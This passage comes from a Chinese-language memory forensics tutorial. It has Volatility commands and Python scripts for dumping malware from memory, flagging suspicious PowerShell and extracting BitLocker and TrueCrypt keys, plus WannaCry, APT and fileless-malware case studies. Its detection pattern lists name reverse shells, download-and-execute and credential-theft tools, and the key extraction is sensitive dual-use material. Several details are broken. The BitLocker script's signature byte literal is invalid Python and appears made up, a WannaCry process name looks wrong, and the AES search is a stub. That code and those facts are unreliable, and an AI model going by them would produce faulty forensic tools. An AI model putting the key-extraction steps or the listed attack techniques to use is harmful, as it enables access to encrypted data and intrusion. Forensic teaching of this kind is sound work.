            ['vol', '-f', self.image, 'windows.pslist',
             '--dump', '--output-dir', self.output_dir],
            capture_output=True, text=True
        )

        print(f"\n[+] Extraction complete. Files in {self.output_dir}:")
        for f in os.listdir(self.output_dir):
            filepath = os.path.join(self.output_dir, f)
            size = os.path.getsize(filepath)
            sha256 = hashlib.sha256(
                open(filepath, 'rb').read()
            ).hexdigest()
            print(f"  {f} ({size} bytes)")
            print(f"    SHA256: {sha256}")

if __name__ == "__main__":
    extractor = MalwareExtractor("memory.raw")
    extractor.extract_all_malware()
```

### 7.2 PowerShell日志

```bash
# 提取PowerShell命令历史
# Volatility不直接支持PowerShell日志提取
# 但可以通过搜索内存中的PowerShell命令

# 方法1：使用strings搜索
strings memory.raw | grep -i "powershell"
strings memory.raw | grep -i "Invoke-"
strings memory.raw | grep -i "IEX"
strings memory.raw | grep -i "DownloadString"
strings memory.raw | grep -i "EncodedCommand"
strings memory.raw | grep -i "Bypass"

# 方法2：搜索Base64编码的PowerShell命令
strings memory.raw | grep -E "^[A-Za-z0-9+/]{100,}={0,2}$" | while read line; do
    echo "$line" | base64 -d 2>/dev/null | strings
done

# 方法3：使用Volatility搜索内存
# Volatility 2: yarascan
vol.py -f memory.raw --profile=Win10x64_19041 yarascan \
  -Y "powershell"

# Volatility 3: 搜索字符串
vol -f memory.raw windows.strings --string "powershell"
```

**PowerShell日志分析脚本：**

```python
import subprocess
import re
import base64

class PowerShellAnalyzer:
    SUSPICIOUS_PATTERNS = [
        r'Invoke-\w+',
        r'IEX\s*\(',
        r'New-Object\s+Net\.WebClient',
        r'DownloadString',
        r'DownloadFile',
        r'Invoke-WebRequest',
        r'Invoke-RestMethod',
        r'Start-Process',
        r'-EncodedCommand',
        r'-ExecutionPolicy\s+Bypass',
        r'Hidden',
        r'powershell\s+-w\s+hidden',
        r'FromBase64String',
        r'Reverse-Shell',
        r'Net\.Sockets\.TcpClient',
        r'System\.Net\.WebClient',
        r'$env:.*http',
        r'reg\s+add',
        r'schtasks\s+/create',
        r'net\s+user\s+/add'
    ]

    def __init__(self, memory_image):
        self.image = memory_image

    def search_powershell_commands(self):
        """搜索PowerShell命令"""
        print("[*] Searching for PowerShell commands in memory...")

        # 提取所有字符串
        result = subprocess.run(
            ['strings', '-n', '20', self.image],
            capture_output=True, text=True
        )

        suspicious_commands = []

        for line in result.stdout.split('\n'):
            for pattern in self.SUSPICIOUS_PATTERNS:
                if re.search(pattern, line, re.IGNORECASE):
                    suspicious_commands.append(line.strip())
                    break

        # 去重
        unique_commands = list(set(suspicious_commands))

        print(f"\n[*] Found {len(unique_commands)} suspicious PowerShell commands:")
        for cmd in unique_commands[:50]:  # 只显示前50条
            print(f"  {cmd[:200]}")

        return unique_commands

    def decode_base64_commands(self):
        """解码Base64编码的PowerShell命令"""
        print("\n[*] Searching for Base64-encoded commands...")

        result = subprocess.run(
            ['strings', '-n', '50', self.image],
            capture_output=True, text=True
        )

        for line in result.stdout.split('\n'):
            # 查找Base64编码的字符串
            match = re.search(
                r'(-EncodedCommand|-e)\s+([A-Za-z0-9+/=]{20,})',
                line
            )
            if match:
                encoded = match.group(2)
                try:
                    decoded = base64.b64decode(encoded).decode('utf-16le', errors='ignore')
                    print(f"  [!] Encoded command found:")
                    print(f"      Encoded: {encoded[:100]}...")
                    print(f"      Decoded: {decoded[:200]}")
                except:
                    pass

if __name__ == "__main__":
    analyzer = PowerShellAnalyzer("memory.raw")
    analyzer.search_powershell_commands()
    analyzer.decode_base64_commands()
```

### 7.3 加密卷密钥提取

```bash
# 提取BitLocker加密密钥
# 方法1：使用Volatility搜索BitLocker密钥
vol -f memory.raw windows.bitlocker

# 方法2：使用AES密钥搜索
# BitLocker使用AES-128或AES-256
# 密钥扩展后的模式可以在内存中找到

# 使用findaes工具搜索AES密钥
findaes memory.raw

# 使用aeskeyfind工具
aeskeyfind memory.raw

# 方法3：使用Rekall
rekal -f memory.raw bitlocker

# TrueCrypt/VeraCrypt密钥提取
# 使用Volatility的truecryptpassphrase插件（Volatility 2）
vol.py -f memory.raw --profile=Win10x64 truecryptpassphrase

# 或使用truecryptmaster插件
vol.py -f memory.raw --profile=Win10x64 truecryptmaster
```

**BitLocker密钥提取脚本：**

```python
import subprocess
import struct

class BitLockerKeyExtractor:
    # BitLocker FVEK（Full Volume Encryption Key）签名
    FVEK_SIGNATURE = b"\xFVEK\x00\x00\x00"
    # BitLocker密钥保护结构签名
    KEY_PROTECTION_SIG = b"\x03\x00\x00\x00"

    def __init__(self, memory_image):
        self.image = memory_image

    def search_bitlocker_keys(self):
        """搜索BitLocker密钥"""
        print("[*] Searching for BitLocker encryption keys...")

        with open(self.image, 'rb') as f:
            offset = 0
            chunk_size = 1024 * 1024  # 1MB

            while True:
                data = f.read(chunk_size)
                if not data:
                    break

                # 搜索FVEK签名
                pos = 0
                while True:
                    pos = data.find(self.FVEK_SIGNATURE, pos)
                    if pos == -1:
                        break

                    # 找到FVEK
                    file_offset = offset + pos
                    print(f"  [+] FVEK found at offset 0x{file_offset:x}")

                    # 尝试提取密钥数据
                    # FVEK结构包含加密算法和密钥
                    key_data_start = pos + 8  # 跳过签名
                    if key_data_start + 64 <= len(data):
                        key_data = data[key_data_start:key_data_start+64]
                        print(f"      Key data (hex): {key_data.hex()}")

                    pos += 1

                offset += chunk_size

        print("[*] BitLocker key search complete")

    def search_aes_keys(self):
        """搜索AES密钥扩展"""
        print("\n[*] Searching for expanded AES keys...")

        # AES密钥扩展后的特征
        # AES-128: 扩展后的密钥有176字节（44个32位字）
        # AES-256: 扩展后的密钥有240字节（60个32位字）

        with open(self.image, 'rb') as f:
            data = f.read()

            # 使用aeskeyfind工具（如果可用）
            try:
                result = subprocess.run(
                    ['aeskeyfind', self.image],
                    capture_output=True, text=True,
                    timeout=300
                )
                print(result.stdout)
            except FileNotFoundError:
                print("  [-] aeskeyfind not installed, using built-in search")
                # 简化的AES密钥搜索
                # 这里仅展示原理，实际实现更复杂

if __name__ == "__main__":
    extractor = BitLockerKeyExtractor("memory.raw")
    extractor.search_bitlocker_keys()
    extractor.search_aes_keys()
```

---

## 8. 实战案例

### 8.1 勒索软件内存分析

**场景：** 某企业感染WannaCry勒索软件，已获取感染主机内存镜像。

```bash
# 1. 基本信息收集
vol -f wannacry.raw windows.info

# 2. 进程分析 - 查找勒索软件进程
vol -f wannacry.raw windows.pslist | grep -i "taskdlxe\|mssecsvc\|wcry\|@WanaDecryptor"

# 3. 检查Kill Switch域名
# WannaCry检查 iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
vol -f wannacry.raw windows.netscan | grep "iuqerf"

# 4. 提取勒索软件进程
vol -f wannacry.raw windows.pslist --pid 1928 --dump
# 提取后计算Hash
sha256sum pid.1928.exe
# 对照已知WannaCry哈希: 5bef1d48...
```

**完整分析脚本：**

```python
import subprocess
import re
import hashlib
import os

class WannaCryAnalyzer:
    # WannaCry已知特征
    KILL_SWITCH_DOMAINS = [
        "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",
        "ifferfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
    ]
    KILL_SWITCH_IPS = ["158.85.156.78", "209.141.40.8"]
    KNOWN_MALWARE_PIDS = ["1928", "1056", "2228"]
    SUSPICIOUS_PROCESS_NAMES = [
        "taskdlxe.exe", "mssecsvc.exe", "wcry.exe",
        "@WanaDecryptor@.exe", "taskse.exe"
    ]

    def __init__(self, memory_image):
        self.image = memory_image
        self.findings = []

    def analyze(self):
        """完整WannaCry分析"""
        print("=" * 60)
        print("WannaCry Ransomware Memory Analysis")
        print("=" * 60)

        self.check_processes()
        self.check_network()
        self.check_file_activity()
        self.extract_artifacts()
        self.generate_report()

    def check_processes(self):
        """检查勒索软件进程"""
        print("\n[*] Checking processes...")

        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.pslist'],
            capture_output=True, text=True
        )

        for line in result.stdout.split('\n'):
            for name in self.SUSPICIOUS_PROCESS_NAMES:
                if name.lower() in line.lower():
                    self.findings.append(
                        f"PROCESS: {line.strip()}"
                    )
                    print(f"  [!] Found: {line.strip()}")

            # 检查异常父进程
            if 'mssecsvc.exe' in line and 'services.exe' not in line:
                self.findings.append(
                    f"PROCESS: Abnormal parent for mssecsvc.exe"
                )

    def check_network(self):
        """检查Kill Switch"""
        print("\n[*] Checking network connections...")

        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.netscan'],
            capture_output=True, text=True
        )

        for line in result.stdout.split('\n'):
            for domain in self.KILL_SWITCH_DOMAINS:
                if domain in line:
                    self.findings.append(
                        f"NETWORK: Kill switch domain found: {line.strip()}"
                    )
                    print(f"  [!] Kill switch: {line.strip()}")

            for ip in self.KILL_SWITCH_IPS:
                if ip in line:
                    self.findings.append(
                        f"NETWORK: Kill switch IP: {line.strip()}"
                    )

    def check_file_activity(self):
        """检查文件操作"""
        print("\n[*] Checking file activity...")

        # 检查勒索文件扩展名相关活动
        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.filescan'],
            capture_output=True, text=True
        )

        suspicious_extensions = ['.WNCRY', '.WNCRYT']
        for line in result.stdout.split('\n'):
            for ext in suspicious_extensions:
                if ext in line:
                    self.findings.append(
                        f"FILE: Encrypted file: {line.strip()}"
                    )

    def extract_artifacts(self):
        """提取证据"""
        print("\n[*] Extracting artifacts...")

        # 提取勒索软件可执行文件
        for pid in self.KNOWN_MALWARE_PIDS:
            result = subprocess.run(
                ['vol', '-f', self.image, 'windows.pslist',
                 '--pid', pid, '--dump',
                 '--output-dir', './extracted'],
                capture_output=True, text=True
            )

            # 检查提取的文件
            extracted_dir = './extracted'
            if os.path.exists(extracted_dir):
                for f in os.listdir(extracted_dir):
                    filepath = os.path.join(extracted_dir, f)
                    if os.path.isfile(filepath):
                        sha256 = hashlib.sha256(
                            open(filepath, 'rb').read()
                        ).hexdigest()
                        self.findings.append(
                            f"EXTRACT: {f} - SHA256: {sha256}"
                        )
                        print(f"  [+] Extracted: {filepath}")
                        print(f"      SHA256: {sha256}")

    def generate_report(self):
        """生成报告"""
        print("\n" + "=" * 60)
        print("ANALYSIS REPORT")
        print("=" * 60)

        for finding in self.findings:
            print(f"  {finding}")

        print(f"\nTotal findings: {len(self.findings)}")

if __name__ == "__main__":
    analyzer = WannaCryAnalyzer("wannacry.raw")
    analyzer.analyze()
```

### 8.2 APT内存取证

**场景：** 怀疑遭到APT组织攻击，从服务器获取内存镜像进行分析。

```bash
# 1. 检测持久化机制
# 检查自启动注册表
vol -f apt.raw windows.registry.printkey \
  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# 检查服务
vol -f apt.raw windows.svcscan | grep -v "Microsoft\|Windows"

# 检查计划任务
vol -f apt.raw windows.registry.printkey \
  --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks"

# 2. 检测注入和Hook
vol -f apt.raw windows.malfind
vol -f apt.raw windows.apihooks
vol -f apt.raw windows.callbacks

# 3. 检测Rootkit
vol -f apt.raw windows.modules
vol -f apt.raw windows.modscan | grep -v "Known\|Microsoft"
vol -f apt.raw windows.ssdt
vol -f apt.raw windows.driverirp

# 4. 网络活动
vol -f apt.raw windows.netscan

# 5. 用户活动
vol -f apt.raw windows.registry.userassist
vol -f apt.raw windows.envars | grep "USERPROFILE\|USERNAME"
```

### 8.3 无文件恶意代码检测

**场景：** 系统行为异常但磁盘上找不到恶意文件，疑似无文件恶意软件。

```bash
# 1. 检测内存中的注入代码
vol -f fileless.raw windows.malfind

# 2. 检查PowerShell活动
# 搜索PowerShell进程
vol -f fileless.raw windows.pslist | grep -i powershell

# 提取PowerShell进程内存
vol -f fileless.raw windows.pslist --pid 8856 --dump

# 搜索PowerShell命令
strings -n 20 fileless.raw | grep -i "Invoke-\|IEX\|DownloadString"

# 3. 检查WMI活动
# WMI常被用于无文件持久化
vol -f fileless.raw windows.pslist | grep -i "wmiprvse\|WMI"

# 4. 检查异常DLL加载
vol -f fileless.raw windows.dlllist --pid 8856

# 5. 检查网络连接
vol -f fileless.raw windows.netscan --pid 8856

# 6. 检查计划任务和COM对象
vol -f fileless.raw windows.registry.printkey \
  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**无文件恶意代码检测脚本：**

```python
import subprocess
import re
import os

class FilelessMalwareDetector:
    def __init__(self, memory_image):
        self.image = memory_image
        self.alerts = []

    def detect(self):
        """检测无文件恶意代码"""
        print("=" * 60)
        print("Fileless Malware Detection")
        print("=" * 60)

        self.check_injected_code()
        self.check_powershell()
        self.check_wmi_activity()
        self.check_scheduled_tasks()
        self.check_com_hijacking()

        print(f"\n[*] Total alerts: {len(self.alerts)}")
        for alert in self.alerts:
            print(f"  [!] {alert}")

    def check_injected_code(self):
        """检查注入代码"""
        print("\n[*] Checking for injected code...")

        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.malfind'],
            capture_output=True, text=True
        )

        current_process = ""
        for line in result.stdout.split('\n'):
            parts = line.split()
            if len(parts) >= 2 and parts[0].isdigit():
                current_process = parts[1]
            if 'PAGE_EXECUTE_READWRITE' in line:
                self.alerts.append(
                    f"Injected RWX memory in {current_process}"
                )
                print(f"  [!] Injected code in {current_process}")

            # 检查MZ头（可执行文件注入）
            if '4d5a' in line.lower():  # MZ header
                self.alerts.append(
                    f"PE file header found in {current_process} memory"
                )

    def check_powershell(self):
        """检查PowerShell活动"""
        print("\n[*] Checking PowerShell activity...")

        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.pslist'],
            capture_output=True, text=True
        )

        for line in result.stdout.split('\n'):
            if 'powershell' in line.lower():
                self.alerts.append(f"PowerShell running: {line.strip()}")
                print(f"  [!] PowerShell: {line.strip()}")

        # 搜索内存中的PowerShell命令
        strings_result = subprocess.run(
            ['strings', '-n', '30', self.image],
            capture_output=True, text=True
        )

        suspicious_patterns = [
            r'Invoke-Mimikatz', r'Invoke-Shellcode',
            r'Invoke-PowerShellTcp', r'Invoke-DllInjection',
            r'IEX.*New-Object', r'DownloadString.*http',
            r'FromBase64String', r'-EncodedCommand'
        ]

        for line in strings_result.stdout.split('\n'):
            for pattern in suspicious_patterns:
                if re.search(pattern, line, re.IGNORECASE):
                    self.alerts.append(
                        f"Suspicious PS command: {line[:100]}"
                    )
                    print(f"  [!] Suspicious: {line[:100]}")
                    break

    def check_wmi_activity(self):
        """检查WMI活动"""
        print("\n[*] Checking WMI activity...")

        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.pslist'],
            capture_output=True, text=True
        )

        for line in result.stdout.split('\n'):
            if 'wmiprvse' in line.lower():
                self.alerts.append(f"WMI process: {line.strip()}")
                print(f"  [!] WMI: {line.strip()}")

    def check_scheduled_tasks(self):
        """检查计划任务"""
        print("\n[*] Checking scheduled tasks...")

        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.registry.printkey',
             '--key',
             'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks'],
            capture_output=True, text=True
        )

        for line in result.stdout.split('\n'):
            if 'powershell' in line.lower() or \
               'cmd' in line.lower() or \
               'rundll32' in line.lower():
                self.alerts.append(
                    f"Suspicious scheduled task: {line.strip()}"
                )
                print(f"  [!] Task: {line.strip()}")

    def check_com_hijacking(self):
        """检查COM劫持"""
        print("\n[*] Checking COM hijacking...")

        result = subprocess.run(
            ['vol', '-f', self.image, 'windows.registry.printkey',
             '--key',
             'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'],
            capture_output=True, text=True
        )

        for line in result.stdout.split('\n'):
            if 'rundll32' in line.lower() or \
               'regsvr32' in line.lower() or \
               'powershell' in line.lower():
                self.alerts.append(
                    f"Suspicious Run entry: {line.strip()}"
                )
                print(f"  [!] Run: {line.strip()}")

if __name__ == "__main__":
    detector = FilelessMalwareDetector("fileless.raw")
    detector.detect()
```

---

## 附录：工具速查

| 工具 | 平台 | 用途 | 获取地址 |
|------|------|------|---------|
| Volatility 3 | 跨平台 | 内存分析框架 | https://github.com/volatilityfoundation/volatility3 |
| Rekall | 跨平台 | 内存分析框架 | https://github.com/google/rekall |
| LiME | Linux | 内存获取 | https://github.com/504ensicsLabs/LiME |
| WinPmem | Windows | 内存获取 | https://github.com/Velocidex/WinPmem |
| PCILeech | 跨平台 | 硬件内存获取 | https://github.com/ufrisk/pcileech |
| Redline | Windows | 内存分析 | https://www.fireeye.com/services/freeware/redline.html |
| findaes | 跨平台 | AES密钥搜索 | https://github.com/AeonMu/bmemtools |
| aeskeyfind | 跨平台 | AES密钥搜索 | https://github.com/AeonMu/bmemtools |
| strings | 跨平台 | 字符串提取 | 系统自带 |
| mimikatz | Windows | 凭证提取 | https://github.com/gentilkiwi/mimikatz |

---

## 参考文献

1. Volatility Foundation: https://www.volatilityfoundation.org/
2. The Art of Memory Forensics — Michael Hale Ligh, Andrew Case, Jamie Levy, Aaron Walters
3. Volatility 3 Documentation: https://volatility3.readthedocs.io/
4. Rekall Documentation: http://rekal.googlecode.com/
5. LiME Documentation: https://github.com/504ensicsLabs/LiME
6. PCILeech: https://github.com/ufrisk/pcileech
7. DFRWS Forensics Challenges: https://dfrws.org/
8. SANS Memory Forensics: https://www.sans.org/courses/for508
9. 《数字取证与应急响应》——刘洋
10. SANS FOR508: Advanced Digital Forensics, Incident Response, and Threat Hunting
